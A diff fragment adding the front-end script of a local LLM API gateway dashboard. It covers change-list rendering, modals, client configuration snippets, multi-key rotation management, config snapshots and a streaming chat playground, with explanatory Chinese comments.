+      ${c.ms ? `<span class="kpi" title="总耗时">${fmtMs(c.ms)}</span>` : ''}
+      ${c.tout ? `<span class="kpi" title="输出 token">${esc(c.tout)} tok</span>` : ''}
+    </div>`}).join('')
+}
+
+// 「免费池变动」这张卡现在同时承载两件事: 变动列表 + 限时活动巡检的告警。
+// 所以"要不要显示这张卡"必须两个都看 —— 只看列表的话, 一条变动都没有时告警会被一起藏掉,
+// 而告警恰恰是"不显示就等于防线静默失效"的那类信息。
+function syncChgCard(){
+  const hasChg = ($('changes').innerHTML || '').trim() !== ''
+  const hasWarn = ($('promowarn').innerHTML || '').trim() !== ''
+  $('chgcard').style.display = (hasChg || hasWarn) ? 'block' : 'none'
+}
+async function loadChanges(){
+  let r; try { r = await api('/api/changes') } catch { return }
+  const list = (r && r.changes) || []
+  if (!list.length) { $('changes').innerHTML = ''; return syncChgCard() }
+  $('chgmeta').textContent = `共 ${list.length} 条，显示最近 50 条`
+  $('changes').innerHTML = list.slice(0, 50).map(c => {
+    // 单行显示: 中间那段独占剩余宽度、超长省略号截断, 完整内容挂 title
+    const tip = `${fmtTime(c.at)} · ${CHG_LABEL[c.type] || c.type} · ${c.label || c.provider} ${c.model || ''}` + (c.note ? ` · ${c.note}` : '')
+    // pool_sync 的 note 是固定长句「auto 路由池已同步为免费目录(19 个模型)」—— 正文只留
+    // 「19 个模型」这个要点，完整句仍在 title 里（信息一点没丢，只是别让过程留痕盖过结果事件）。
+    // ⚠ 括号必须**半角全角都收**（2026-10-04 踩到）：我按全角 `（` 写正则，而服务端实际输出的是
+    //   半角 `(` → 匹配不上 → 静默回退到完整长句，看起来"改了没生效"。**别假设字符串格式，看实际值**。
+    const syncN = c.type === 'pool_sync' ? (String(c.note || '').match(/[（(](\d+ 个模型)[）)]/) || [])[1] : ''
+    const noteTxt = syncN || c.note || ''
+    return `
+    <div class="chg">
+      <span class="tm">${fmtTime(c.at)}</span>
+      <span class="tag ${c.type}">${CHG_LABEL[c.type] || c.type}</span>
+      <span class="bd" title="${esc(tip)}"><b>${esc(c.label || c.provider)}</b> <span class="mdl">${esc(c.model)}</span> <span class="nt">${esc(noteTxt)}</span></span>
+    </div>`}).join('')
+  syncChgCard()
+}
+
+// ══════════════════════════════════════════════════════════════
+// 视图切换 / 通用弹层 / 配置片段 / 多 Key 管理 / 链路自检
+// ══════════════════════════════════════════════════════════════
+
+// ── 视图切换 ──
+function switchView(v){
+  const play = v === 'play'
+  $('view-dash').style.display = play ? 'none' : ''
+  $('view-play').style.display = play ? '' : 'none'
+  ;[['tab-dash', !play], ['tab-play', play]].forEach(([id, on]) => {
+    const t = $(id); if (!t) return
+    t.classList.toggle('on', on)
+    t.setAttribute('aria-selected', on ? 'true' : 'false')
+  })
+  if (play) initPlay()
+}
+
+// ── 通用弹层 ──
+// 三处复用: 配置片段 / Key 管理 / 二次确认。ESC 与点背景关闭在这里统一处理,
+// 免得每个调用点各写一遍 —— 漏一个就变成"关不掉的弹层"。
+let MODAL_OPEN = false
+let CONFIRM_FN = null
+function openModal(title, bodyHtml){
+  $('modal_title').textContent = title
+  $('modal_body').innerHTML = bodyHtml
+  $('modal').style.display = ''
+  MODAL_OPEN = true
+  const f = $('modal_body').querySelector('input,select,textarea,button')
+  if (f) { try { f.focus() } catch {} }
+}
+function closeModal(){
+  $('modal').style.display = 'none'
+  MODAL_OPEN = false
+  CONFIRM_FN = null
+  $('modal_body').innerHTML = ''
+}
+// 破坏性操作一律走二次确认。文案里必须写清"会发生什么", 不写"确定吗?"这种没信息量的问句。
+function confirmModal(title, desc, fn, yesLabel){
+  CONFIRM_FN = fn
+  openModal(title, `<p class="desc">${esc(desc)}</p>
+    <div class="mfoot"><button class="small gray" data-act="close-modal">取消</button><button class="small" data-act="confirm-yes">${esc(yesLabel || '确认')}</button></div>`)
+}
+async function runConfirm(){ const f = CONFIRM_FN; closeModal(); if (f) await f() }
+function copyRaw(text, label){
+  if (!text) return
+  navigator.clipboard.writeText(text).then(() => toast(label || '已复制')).catch(() => toast('复制失败', '请手动选中复制', 'err'))
+}
+
+// ── 配置片段 ─────────────────────────────────────────────────
+// 目的: 让"接进某个客户端"从"读文档猜路径"变成"复制三行"。
+// 所有片段里的 Base URL 用 location.origin, 所以从局域网地址打开时给出的也是那个地址。
+let SNIP_K = 'workbuddy'
+function snippets(){
+  const B = location.origin, K = GKEY || '<网关 Key>'
+  return [
+    {
+      k: 'workbuddy', t: 'WorkBuddy / 通用 OpenAI 客户端',
+      note: '任何能填「自定义 Base URL」的客户端都填这三行。模型写 auto 就会自动挑池子里最合适的免费模型，失败了自动回退下一家。',
+      code: [
+        `Base URL : ${B}/v1`,
+        `API Key  : ${K}`,
+        '模型      : auto',
+        '',
+        '# 想固定来源就写「供应商名/模型名」：',
+        '#   groq/llama-3.3-70b-versatile',
+        '#   gemini/models/gemini-3-flash-preview',
+      ].join('\n'),
+    },
+    {
+      k: 'curl', t: 'curl（验证链路最快的方式）',
+      note: '先跑这一条确认网关活着，再往客户端里填。带 stream:true 能直接看到逐字输出。',
+      code: [
+        `curl ${B}/v1/chat/completions \\`,
+        `  -H "Authorization: Bearer ${K}" \\`,
+        '  -H "Content-Type: application/json" \\',
+        `  -d '{"model":"auto","messages":[{"role":"user","content":"你好"}],"stream":true}'`,
+        '',
+        '# 想知道这次 auto 选了谁：看响应头里的 x-request-id，',
+        `# 再查 ${B}/api/usage?id=<那个 id>`,
+      ].join('\n'),
+    },
+    {
+      k: 'python', t: 'Python（openai 官方 SDK）',
+      note: '只改 base_url 与 api_key 两行，其余代码与用 OpenAI 完全一样。',
+      code: [
+        'from openai import OpenAI',
+        '',
+        `c = OpenAI(base_url="${B}/v1", api_key="${K}")`,
+        'r = c.chat.completions.create(',
+        '    model="auto",',
+        '    messages=[{"role": "user", "content": "你好"}],',
+        ')',
+        'print(r.choices[0].message.content)',
+      ].join('\n'),
+    },
+    {
+      k: 'node', t: 'Node.js（零依赖 fetch）',
+      note: 'Node 18+ 自带 fetch，不用装任何包。流式读法与仪表盘调试台用的是同一套。',
+      code: [
+        'const r = await fetch("' + B + '/v1/chat/completions", {',
+        '  method: "POST",',
+        `  headers: { "content-type": "application/json", authorization: "Bearer ${K}" },`,
+        '  body: JSON.stringify({ model: "auto", messages: [{ role: "user", content: "你好" }], stream: true }),',
+        '})',
+        'const reader = r.body.getReader(), dec = new TextDecoder()',
+        'let buf = ""',
+        'while (true) {',
+        '  const { value, done } = await reader.read()',
+        '  if (done) break',
+        '  buf += dec.decode(value, { stream: true })',
+        '  let i',
+        '  while ((i = buf.indexOf("\\n")) >= 0) {',
+        '    const line = buf.slice(0, i).trim(); buf = buf.slice(i + 1)',
+        '    if (!line.startsWith("data:")) continue',
+        '    const p = line.slice(5).trim()',
+        '    if (p === "[DONE]") return',
+        '    process.stdout.write(JSON.parse(p).choices[0].delta.content || "")',
+        '  }',
+        '}',
+      ].join('\n'),
+    },
+    {
+      k: 'claude', t: 'Claude Code / Anthropic SDK',
+      note: '网关原生支持 /v1/messages，所以 Anthropic 系客户端不用改代码，改环境变量即可。Base 填到根，SDK 自己会补 /v1/messages。',
+      code: [
+        `export ANTHROPIC_BASE_URL="${B}"`,
+        `export ANTHROPIC_AUTH_TOKEN="${K}"`,
+        'export ANTHROPIC_MODEL="auto"',
+        '',
+        '# Claude Code 直接读这三个变量，无需其它配置。',
+      ].join('\n'),
+    },
+    {
+      k: 'gemini', t: 'Gemini（原生 v1beta 协议）',
+      note: 'Google SDK 走 /v1beta/models/<模型>:generateContent，网关已做协议转换，Key 用网关 Key（x-goog-api-key 或 Bearer 都认）。',
+      code: [
+        `export GOOGLE_GEMINI_BASE_URL="${B}"`,
+        `export GEMINI_API_KEY="${K}"`,
+        '',
+        '# 等价的裸 HTTP：',
+        `# POST ${B}/v1beta/models/auto:streamGenerateContent`,
+        `#   header: x-goog-api-key: ${K}`,
+      ].join('\n'),
+    },
+    {
+      k: 'ollama', t: 'Ollama 客户端 / 兼容层',
+      note: '网关同时提供 /api/chat、/api/generate 与 /api/tags，把 Ollama 客户端的地址指过来即可，模型列表里会直接出现池子里的模型。',
+      code: [
+        `export OLLAMA_HOST="${B}"`,
+        '',
+        `# 验证： curl ${B}/api/tags`,
+        `# 对话： curl ${B}/api/chat -d '{"model":"auto","messages":[{"role":"user","content":"你好"}]}'`,
+      ].join('\n'),
+    },
+  ]
+}
+function openSnippets(){
+  const list = snippets()
+  if (!list.some((s) => s.k === SNIP_K)) SNIP_K = list[0].k
+  const s = list.find((x) => x.k === SNIP_K)
+  openModal('接入配置片段', `
+    <p class="desc">下面是各种客户端的现成配置，直接复制。<b>Key 是本机网关 Key</b>（不是厂商的 Key）—— 厂商 Key 只存在 config.json 里，不会离开这台机器。</p>
+    <div class="snip-tabs">${list.map((x) => `<button class="snip-tab ${x.k === s.k ? 'on' : ''}" data-act="snip-tab" data-k="${x.k}">${esc(x.t.split('（')[0])}</button>`).join('')}</div>
+    <div class="snip-note">${esc(s.note)}</div>
+    <pre class="snip-pre" id="snip_pre">${esc(s.code)}</pre>
+    <div class="mfoot"><button class="small gray" data-act="close-modal">关闭</button><button class="small" data-act="copy-el" data-el="snip_pre" data-label="已复制配置片段">复制这段</button></div>`)
+}
+function snipTab(k){ SNIP_K = k; openSnippets() }
+
+// ── 多 Key 精细管理 ──────────────────────────────────────────
+// 一个供应商可以配多把 Key 轮换。网关按「当前可用」挑一把, 某把失效会自动冷却并换下一把;
+// 这里把每把 Key 各自的冷却/成败/启停暴露出来 —— 否则某把 Key 悄悄失效后,
+// 用户只能从"这家最近老失败"里猜, 而且会把责任错怪到整个厂商头上。
+let KEYS_PID = null
+let KEYS_DATA = []
+// ── 配置快照（2026-10-17）────────────────────────────────────────
+// 本项目没有 git，改坏 config.json 只能靠 .prev 退回上一版。快照是"主动打的时间点"，
+// 回滚只覆盖配置项（服务端 snapshotMerge 的规则），所以这里文案必须说清"什么会变、什么不会变"。
+async function openSnapshots(){
+  openModal('配置快照', '<p class="desc">读取中…</p>')
+  await renderSnapshots()
+}
+async function renderSnapshots(){
+  const r = await api('/api/snapshots', { auth: true })
+  if (!r || !r.ok) {
+    $('modal_body').innerHTML = '<p class="desc stat-err">读取失败：' + esc((r && r.error) || '未知错误') + '</p>'
+      + '<div class="mfoot"><button class="small gray" data-act="close-modal">关闭</button></div>'
+    return
+  }
+  const items = r.items || []
+  const rows = items.length ? items.map((x) => '<div class="srow">'
+      + '<span class="snm">' + esc(x.name) + '</span>'
+      + '<span class="smeta">' + esc(fmtShort(x.at)) + ' · ' + x.providers + ' 家供应商</span>'
+      + '<button class="small gray" data-act="snap-restore" data-name="' + esc(x.name) + '">回滚</button>'
+      + '<button class="small danger" data-act="snap-del" data-name="' + esc(x.name) + '">删除</button>'
+      + '</div>').join('')
+    : '<p class="desc">还没有快照。改配置之前先存一个，改坏了能一键退回。</p>'
+  $('modal_body').innerHTML = '<p class="desc" style="margin-bottom:10px">存在 <code>config.json.snap-名字</code>。回滚只覆盖配置项，冷却 / 拉黑 / 实测学习这些运行时状态保留当前值。</p>'
+    + '<div style="display:flex;gap:8px;margin-bottom:6px"><input id="snap_name" placeholder="快照名，例如 改路由前" style="flex:1">'
+    + '<button class="small" data-act="snap-save">存一份</button></div>'
+    + '<div>' + rows + '</div>'
+    + '<div class="mfoot"><button class="small gray" data-act="close-modal">关闭</button></div>'
+}
+async function snapSave(){
+  const name = (($('snap_name') || {}).value || '').trim()
+  if (!name) return toast('先给快照起个名字', '例如「改路由前」', 'warn', 2500)
+  const r = await api('/api/snapshots', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ action: 'save', name }) })
+  if (!r || !r.ok) return toast('保存失败', (r && r.error) || '未知错误', 'err', 4000)
+  toast('已保存快照', r.name + ' · ' + r.providers + ' 家供应商', 'ok', 2500)
+  await renderSnapshots()
+}
+function snapRestore(name){
+  confirmModal('回滚到这个快照？',
+    '配置项会退回「' + name + '」那一刻；冷却 / 拉黑 / 实测学习保留当前值。当前配置会先备份成 config.json.pre-restore.*，所以这一步也能再退回来。',
+    async () => {
+      const r = await api('/api/snapshots', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ action: 'restore', name }) })
+      if (!r || !r.ok) return toast('回滚失败', (r && r.error) || '未知错误', 'err', 4000)
+      toast('已回滚', name + ' · 备份 ' + r.backup, 'ok', 3000)
+      // 供应商集合可能变了（多了/少了几家），整页重载比逐块补渲染更可靠
+      setTimeout(() => location.reload(), 800)
+    }, '回滚')
+}
+function snapDel(name){
+  confirmModal('删除这个快照？', '只删 config.json.snap-' + name + ' 这个文件，当前配置不受影响。', async () => {
+    const r = await api('/api/snapshots', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ action: 'delete', name }) })
+    if (!r || !r.ok) return toast('删除失败', (r && r.error) || '未知错误', 'err', 4000)
+    await renderSnapshots()
+  }, '删除')
+}
+async function openKeysModal(id){
+  KEYS_PID = id
+  const p = LAST.find((x) => x.id === id) || {}
+  openModal('API Key 管理 · ' + (p.label || id), '<p class="desc">读取中…</p>')
+  await reloadKeys()
+}
+async function reloadKeys(){
+  // 读接口也要求网关 Key（掩码里仍含密钥片段, 没有理由让免鉴权 GET 就能枚举）
+  const r = await api(`/api/providers/${encodeURIComponent(KEYS_PID)}/keys`, { auth: true })
+  if (!r || !r.ok) {
+    $('modal_body').innerHTML = `<p class="desc stat-err">读取失败：${esc((r && r.error) || '未知错误')}</p>
+      <div class="mfoot"><button class="small gray" data-act="close-modal">关闭</button></div>`
+    return
+  }
+  KEYS_DATA = r.keys || []
+  renderKeys(r)
+}
+function renderKeys(r){
+  const active = r && r.activeIdx
+  const onlyOne = KEYS_DATA.length <= 1
+  const enabledCount = KEYS_DATA.filter((k) => !k.disabled).length
+  const rows = KEYS_DATA.map((k) => {
+    // 注定会被服务端拒掉的操作直接置灰并写清原因 —— 让用户点一下、等一个往返、
+    // 再弹一条错误, 是最差的交互: 明明页面上就有足够信息判断"这一步不行"。
+    const lastEnabled = !k.disabled && enabledCount <= 1
+    return `
+    <div class="krow ${k.disabled ? 'off' : ''}">
+      <span class="kid" title="只显示掩码。完整 Key 只存在本机 config.json 里，任何接口都不回传明文">${esc(k.mask)}</span>
+      ${k.idx === active ? '<span class="kbadge">当前使用</span>' : ''}
+      ${k.disabled ? '<span class="kbadge dis">已停用</span>'
+        : k.cooling ? `<span class="kbadge cd">冷却至 ${fmtTime(k.until)}</span>`
+        : '<span class="kbadge">可用</span>'}
+      <span class="kmeta">成功 ${k.ok} · 失败 ${k.err}${k.lastUsed ? ' · 最近 ' + fmtTime(k.lastUsed) : ''}</span>
+      <span class="pops">
+        <button class="small gray" data-act="keys-toggle" data-idx="${k.idx}" data-on="${k.disabled ? '1' : '0'}"
+          ${lastEnabled ? 'disabled' : ''} title="${lastEnabled ? '这是唯一启用中的 Key，停用后这家将永远没有可用 Key' : ''}">${k.disabled ? '启用' : '停用'}</button>
+        <button class="small gray" data-act="keys-reset" data-idx="${k.idx}" ${k.cooling ? '' : 'disabled'} title="${k.cooling ? '立即解除这把 Key 的冷却' : '这把 Key 没在冷却'}">解除冷却</button>
+        <button class="small danger" data-act="keys-remove" data-idx="${k.idx}"
+          ${onlyOne ? 'disabled' : ''} title="${onlyOne ? '至少要保留一把 Key；想清空请直接删除该供应商' : ''}">删除</button>
+      </span>
+    </div>`
+  }).join('')
+  $('modal_body').innerHTML = `
+    <p class="desc">同一家的多把 Key 会<b>自动轮换</b>：优先用没在冷却的那把；某把报 401/额度用完会单独冷却它自己，其余 Key 照常工作。这里的启停是人工兜底，优先级高于自动冷却。</p>
+    ${rows || '<p class="desc">这家还没有 Key。</p>'}
+    <div class="drow">
+      <input id="k_new" type="password" placeholder="粘贴要新增的 Key（sk-...）" aria-label="新增 Key" autocomplete="off">
+      <button data-act="keys-add">添加</button>
+    </div>
+    <div class="mfoot"><button class="small gray" data-act="close-modal">关闭</button></div>`
+}
+// 所有改动后统一重读服务端 —— 不在前端"猜"新状态。逐 Key 的冷却/统计都由服务端算,
+// 前端自己拼一份迟早和服务端对不上(尤其删除会触发下标整体前移)。
+async function keysMutate(path, payload, okMsg){
+  const r = await api(`/api/providers/${encodeURIComponent(KEYS_PID)}/keys/${path}`, { method: 'POST', body: JSON.stringify(payload || {}) })
+  if (!r.ok) { toast('操作失败', r.error || '未知错误', 'err'); return false }
+  if (okMsg) toast(okMsg)
+  refresh()
+  await openKeysModal(KEYS_PID)
+  return true
+}
+async function keysAdd(){
+  const el = $('k_new')
+  const v = ((el && el.value) || '').trim()
+  if (!v) { toast('先粘贴 Key', '输入框还是空的', 'err', 2500); if (el) el.focus(); return }
+  await keysMutate('add', { key: v }, '已添加，立即参与轮换')
+}
+function keysRemove(idx){
+  const k = KEYS_DATA.find((x) => x.idx === idx)
+  confirmModal('删除这把 Key？',
+    `将删除 ${k ? k.mask : '#' + idx}。删除后这家剩下的 Key 会按新顺序重新编号，冷却与成败统计会一起跟着挪，不会错位。`,
+    () => keysMutate('remove', { idx }, '已删除'), '删除')
+}
+function keysToggle(idx, enable){
+  keysMutate('toggle', { idx, enabled: enable }, enable ? '已启用该 Key' : '已停用该 Key（不会再被选中）')
+}
+function keysReset(idx){
+  keysMutate('reset', { idx }, '已解除该 Key 的冷却')
+}
+
+// ── 在线调试台 ───────────────────────────────────────────────
+// ⚠ 这里**不能复用 api()**: 它内部 r.json() 会把流式响应整个吞掉(SSE 不是合法 JSON)。
+// 打的是网关自己的 /v1/chat/completions, 走完整路由链 —— 测的就是真实链路,
+// 而不是"绕过网关直连上游"那种测了个寂寞的调试台。
+let PG_INITED = false, PG_LOADING = false, PG_BUSY = false, PG_CTRL = null
+async function initPlay(){
+  if (PG_INITED || PG_LOADING) return
+  PG_LOADING = true
+  // 模型清单取自 /api/state 的「路由池」，**不用 /v1/models**：
+  //  1) /v1/models 对每个模型回两条记录（裸名 + 厂商/模型），而很多模型自己的名字里就带斜杠
+  //     （meta-llama/llama-3.3-70b、groq/compound 这类），没法靠"有没有斜杠"区分出哪条是裸名 ——
+  //     实测 121 条里有 37 条裸名带斜杠，直接导致下拉里出现 37 个落点不明的重复项。
+  //  2) 这里要的是"现在能用的模型"，已被拉黑 / 自动隔离 / 人工停用的本就不该出现在下拉里。
+  // 两者都靠 /api/state 一次解决，还省掉一次网络往返。
+  if (!LAST.length) { try { await refresh() } catch {} }
+  const groups = []
+  let excluded = 0
+  for (const p of LAST) {
+    if (p.enabled === false) continue
+    const blk = Object.keys(p.blocked || {}), qtn = Object.keys(p.quarantine || {}), dis = Object.keys(p.disabledModels || {})
+    const all = (p.models && p.models.length ? p.models : [p.model]).filter(Boolean)
+    const pool = all.filter((m) => !blk.includes(m) && !qtn.includes(m) && !dis.includes(m))
+    excluded += all.length - pool.length
+    if (pool.length) groups.push([p.label || p.name, pool.map((m) => `${p.name}/${m}`)])
+  }
+  let html = '<option value="auto">auto（自动路由）</option>'
+  for (const [label, ids] of groups.sort((a, b) => String(a[0]).localeCompare(String(b[0])))) {
+    html += `<optgroup label="${esc(label)}">` + ids.sort().map((id) => `<option value="${esc(id)}">${esc(id)}</option>`).join('') + '</optgroup>'
+  }
+  $('pg_model').innerHTML = html
+  $('pg_model').title = excluded ? `另有 ${excluded} 个模型已被拉黑 / 隔离 / 停用，不在可选范围内` : '列出的都是当前可路由的模型'
+  $('pg_name_a').textContent = $('pg_model').value
+  PG_INITED = true
+  PG_LOADING = false
+}
+// finish_reason 必须显示出来: 报 length 说明答案被截断了, 而截断的半截内容看起来
+// 和"答完了"一模一样 —— 不显示的话用户会把半句话当成模型的最终回答。
+function pgStat(ms, ttfb, tok, fin){
+  const bits = []
+  if (ttfb) bits.push(fmtMs(ttfb) + ' 首字')
+  bits.push(fmtMs(ms) + ' 总')
+  if (tok) bits.push(tok + ' tok' + (ms > 0 ? ` · ${(tok / (ms / 1000)).toFixed(1)} tok/s` : ''))
+  if (fin && fin !== 'stop') bits.push('finish=' + fin + '（内容被截断）')
+  return bits.join(' · ')
+}
+// 把指标灌进 7 个 pill —— job.stat(pg_stat_a) 仍保留组合字符串以满足测试断言
+// "包含 finish=", 这里是结构化展示, 一眼看清不用逐项解析。
+function pgFillPills({ ms = 0, ttfb = 0, tok = 0, fin = '' } = {}){
+  $('pg_stat_ttfb').textContent = ttfb ? fmtMs(ttfb) : '—'
+  $('pg_stat_ms').textContent = ms ? fmtMs(ms) : '—'
+  $('pg_stat_tok').textContent = tok ? tok + ' tok' : '—'
+  $('pg_stat_fin').textContent = fin || '—'
+}
+function pgSetRid(rid){
+  if (!rid) { $('pg_stat_rid').textContent = '—'; return }
+  $('pg_stat_rid').innerHTML = `<span class="rid" role="button" tabindex="0" data-act="copy-text" data-text="${esc(rid)}" data-label="请求 ID" title="点击复制 · 用 /api/usage?id=${esc(rid)} 查全部候选轨迹">${esc(rid)}</span>`
+}
+function pgSetProv(p, m){
+  $('pg_stat_prov').innerHTML = (p && m) ? `<b>${esc(p)}/${esc(m)}</b>` : '—'
+}
+function pgFillPrompt(text){
+  const t = $('pg_in'); t.value = text; t.focus()
+  // 自动长高一行: 单行输入框常见做法, 但 textarea 不会自动撑高, 也不需要 —— rows=3 已能容纳 3 行
+}
+// 请求结束后用请求 ID 反查这次到底是谁答的 —— 走已有的 /api/usage, 不新增接口。
+async function attachProv(job, rid){
+  if (!rid) return
+  let q = null
+  try { q = await api('/api/usage?id=' + encodeURIComponent(rid)) } catch { return }
+  const hit = ((q && q.records) || []).find((x) => x.ok)
+  if (hit) {
+    job.stat.title = `请求 ID ${rid} · ${hit.provider}/${hit.model}`
+    pgSetProv(hit.provider, hit.model)
+  } else {
+    job.stat.title = '请求 ID ' + rid
+  }
+}
+async function playOne(job, prompt, signal){
+  const t0 = performance.now()
+  let ttfb = 0, text = '', tok = 0, fin = ''
+  const cur = document.createElement('span'); cur.className = 'cur'
+  const body = { model: job.model, messages: [{ role: 'user', content: prompt }], stream: true, max_tokens: 800 }
+  let r
+  try {
+    r = await fetch('/v1/chat/completions', {
+      method: 'POST', signal,
+      headers: { 'content-type': 'application/json', authorization: 'Bearer ' + GKEY },
+      body: JSON.stringify(body),
+    })
+  } catch (e) {
+    job.out.textContent = signal.aborted ? '已停止。' : '网络错误：' + e.message
+    job.stat.textContent = signal.aborted ? '已停止' : '失败'
+    return
+  }
+  const rid = r.headers.get('x-request-id') || ''
+  // 请求 ID 单独灌到状态条 pill, 不再混进 tip —— tip 现在只回答"停止会怎样"
+  pgSetRid(rid)
+  if (!r.ok) {
+    let msg = 'HTTP ' + r.status
+    try {
+      const j = await r.json()
+      const e = j && j.error
+      msg = (e && (e.message || e)) || (j && j.message) || msg
+      if (j && j.request_id) msg += `（请求 ${j.request_id}）`
+    } catch {}
+    job.out.textContent = msg
+    job.stat.textContent = '失败'
+    return
+  }
+  const ct = r.headers.get('content-type') || ''
+  // 万一这次没走流式(上游不支持 / 网关判定为非流式), 按普通 JSON 读。
+  // 硬套 SSE 解析会得到一片空白 —— "没有报错但也没有内容"是最难排查的一类现象。
+  if (!ct.includes('event-stream')) {
+    let j = null
+    try { j = await r.json() } catch {}
+    const c = j && j.choices && j.choices[0]
+    text = (c && ((c.message && c.message.content) || c.text)) || ''
+    tok = (j && j.usage && j.usage.completion_tokens) || 0
+    fin = (c && c.finish_reason) || ''
+    job.out.textContent = text || '（上游返回了空内容）'
+    const ms = performance.now() - t0
+    job.stat.textContent = pgStat(ms, 0, tok, fin)
+    pgFillPills({ ms, ttfb: 0, tok, fin })
+    await attachProv(job, rid)
+    return
+  }
+  const reader = r.body.getReader()
+  const dec = new TextDecoder()
+  let buf = '', stop = false
+  while (!stop) {
+    let chunk
+    try { chunk = await reader.read() } catch { break }
+    if (chunk.done) break
+    // ⚠ 必须按行缓冲再切。直接 split('\n') 的话, TCP 分包把一行 JSON 从中间切开时,
+    // 两半都 parse 失败并被 catch 吞掉 —— 页面表现为"静默少字", 最难发现的一类 bug。
+    buf += dec.decode(chunk.value, { stream: true })
+    let i
+    while ((i = buf.indexOf('\n')) >= 0) {
+      const line = buf.slice(0, i).trim()
+      buf = buf.slice(i + 1)
+      if (!line.startsWith('data:')) continue
+      const pl = line.slice(5).trim()
+      if (pl === '[DONE]') { stop = true; break }
+      let j
+      try { j = JSON.parse(pl) } catch { continue }
+      const ch = j.choices && j.choices[0]
+      const d = ch && (ch.delta ? ch.delta.content : (ch.message ? ch.message.content : ''))
+      if (d) {
+        if (!ttfb) ttfb = performance.now() - t0
+        text += d
+        // 用 textContent 而不是 innerHTML: 模型输出是不可信内容,
+        // 拼 innerHTML 等于把上游的返回值当代码执行。
+        job.out.textContent = text
+        job.out.appendChild(cur)
+        job.out.scrollTop = job.out.scrollHeight
+      }
+      if (j.usage && j.usage.completion_tokens) tok = j.usage.completion_tokens
+      if (ch && ch.finish_reason) fin = ch.finish_reason
+    }
+  }
+  cur.remove()
+  const ms = performance.now() - t0
+  if (signal.aborted) {
+    job.out.textContent = (text || '') + '\n\n— 已停止 —'
+    job.stat.textContent = '已停止 · ' + pgStat(ms, ttfb, tok, '')
+    pgFillPills({ ms, ttfb, tok })
+    return
+  }
+  if (!text) job.out.textContent = '（上游返回了空内容）'
+  job.stat.textContent = pgStat(ms, ttfb, tok, fin)
+  pgFillPills({ ms, ttfb, tok, fin })
+  await attachProv(job, rid)
+}
+async function playRun(){
+  if (PG_BUSY) return
+  const prompt = ($('pg_in').value || '').trim()
+  if (!prompt) { toast('先写点什么', '调试台发的是真实请求，空提示词没有意义', 'err', 2600); $('pg_in').focus(); return }
+  PG_BUSY = true
+  $('pg_run').disabled = true
+  $('pg_stop').disabled = false
+  const job = { out: $('pg_out_a'), stat: $('pg_stat_a'), name: $('pg_name_a'), model: $('pg_model').value }
+  job.name.textContent = job.model
+  job.out.textContent = '等待上游首字…'
+  job.stat.textContent = ''
+  pgFillPills({})
+  pgSetProv(null, null)
+  PG_CTRL = new AbortController()
+  try {
+    await playOne(job, prompt, PG_CTRL.signal)
+  } finally {
+    PG_BUSY = false
+    PG_CTRL = null
+    $('pg_run').disabled = false
+    $('pg_stop').disabled = true
+  }
+}
+function playStop(){
+  if (!PG_CTRL) return
+  PG_CTRL.abort()
+  toast('已停止', '同时中止了上游请求，不会再空烧免费额度', 'ok', 2600)
+}
+function playClear(){
+  if (PG_BUSY) { toast('正在输出', '先点停止再清空', 'err', 2500); return }
+  for (const id of ['pg_out_a', 'pg_stat_a']) { const e = $(id); if (e) { e.textContent = ''; e.removeAttribute('title') } }
+  $('pg_stat_a').textContent = '就绪 · 等待发送'
+  $('pg_in').value = ''
+  $('pg_in').focus()
+  pgFillPills({}); pgSetRid(''); pgSetProv(null, null)
+}
+
+function copyText(id){ navigator.clipboard.writeText($(id).textContent).then(()=>toast('已复制')).catch(()=>toast('复制失败','请手动选中复制','err')) }
+
+// ── 事件接线 ─────────────────────────────────────────────────
+$('modal').addEventListener('click', (e) => { if (e.target === $('modal')) closeModal() })
+$('pg_model').addEventListener('change', () => { $('pg_name_a').textContent = $('pg_model').value })
+$('pg_in').addEventListener('keydown', (e) => { if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) { e.preventDefault(); playRun() } })
+
+// 页面在后台时不做任何轮询: 切到别的标签页后还每 8 秒重绘整页纯属白烧 CPU,
+// 而且刷新回来那次重绘会让用户正在看的展开态闪一下。回到前台立刻补一次。
+// ⚠ 使用记录原来每 5 秒拉一次(一次 30 条 JSON), 比整页状态还勤 —— 它是"看一眼最近有没有异常"
+// 的面板, 20 秒足够, 省下来的往返比那点实时性值钱。
+const tick = (fn, ms) => setInterval(() => { if (!document.hidden) fn() }, ms)
+tick(refresh, 8000)
+tick(loadUsage, 20000)
+// 巡检结论变化很少(活动结束才变一次), 但"巡检自身失效"必须尽快露面, 所以每分钟看一眼。
+tick(loadPromo, 60000)
+document.addEventListener('visibilitychange', () => {
+  if (document.hidden) return
+  refresh(); loadUsage()
+})
+refresh(); loadCatalogOnce(); loadChanges(); loadUsage(); loadPromo()
+</script>
+</body>
+</html>
